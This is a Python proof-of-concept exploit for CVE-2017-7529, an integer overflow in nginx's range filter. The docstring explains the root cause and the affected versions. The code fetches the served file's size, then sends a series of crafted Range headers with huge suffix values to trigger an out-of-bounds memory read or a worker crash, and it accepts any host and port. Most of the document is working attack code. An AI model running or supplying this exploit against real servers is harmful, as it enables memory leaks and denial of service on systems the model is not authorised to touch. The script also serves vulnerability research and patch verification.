#!/usr/bin/env python3
"""
PoC for CVE-2017-7529 - nginx range filter integer overflow (CWE-190).

Root cause: ngx_http_range_parse() / ngx_http_range_singlepart_body() in
src/http/modules/ngx_http_range_filter_module.c parse a client Range header
into signed offsets. A crafted "Range: bytes=-<huge>,-<huge2>" (suffix-range
form) overflows the offset arithmetic so `start`/`end` wrap to a negative value.
The body filter then reads from `buf->file_pos` with the wrapped offset, an
out-of-bounds heap/file-buffer READ that leaks memory before the file buffer.

Under ASan (server + range module instrumented) the OOB read aborts the worker.

Trigger (classic en0f form): first learn the served file size, then send a
suffix Range whose magnitude, multiplied/added inside the parser, overflows
off_t and produces a negative start offset.

Affected: nginx 0.5.6 - 1.13.2 (fixed 1.13.3 / 1.12.1).
Usage: poc_cve_2017_7529.py [host] [port]
"""
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80


def http(req: bytes, read: int = 512) -> bytes:
    s = socket.create_connection((HOST, PORT), timeout=4)
    s.sendall(req)
    chunks = b""
    try:
        while len(chunks) < read:
            d = s.recv(read)
            if not d:
                break
            chunks += d
    except (socket.timeout, ConnectionResetError):
        pass
    s.close()
    return chunks


def get_file_size() -> int:
    resp = http(f"HEAD / HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            return int(line.split(b":")[1].strip())
    return 0


def main() -> int:
    size = get_file_size()
    print(f"[*] served file Content-Length = {size}")
    # Published en0f/liusec multipart-suffix forms that overflow off_t in
    # ngx_http_range_parse(). The first suffix is just under the file size; the
    # second is the huge value whose addition wraps `start` negative, so the
    # body filter reads before the file buffer.
    candidates = [
        f"bytes=-{size},-9223372036854775808",
        f"bytes=-{max(size - 1, 1)},-9223372036854775807",
        f"bytes=-1,-9223372036854775808",
        f"bytes=0-1,-9223372036854775808",
        f"bytes=-{size},-{0x8000000000000000 - size - 1}",
    ]
    for rng in candidates:
        print(f"[*] sending Range: {rng[:60]}")
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"Range: {rng}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        try:
            resp = http(req)
        except (ConnectionResetError, BrokenPipeError, ConnectionRefusedError, OSError):
            print("[+] connection error - worker likely crashed")
            return 0
        status = resp.split(b"\r\n", 1)[0] if resp else b"(no response / reset)"
        print(f"    response: {status!r}")
    print("[*] all range variants sent - check docker logs for ASan abort")
    return 0


if __name__ == "__main__":
    sys.exit(main())
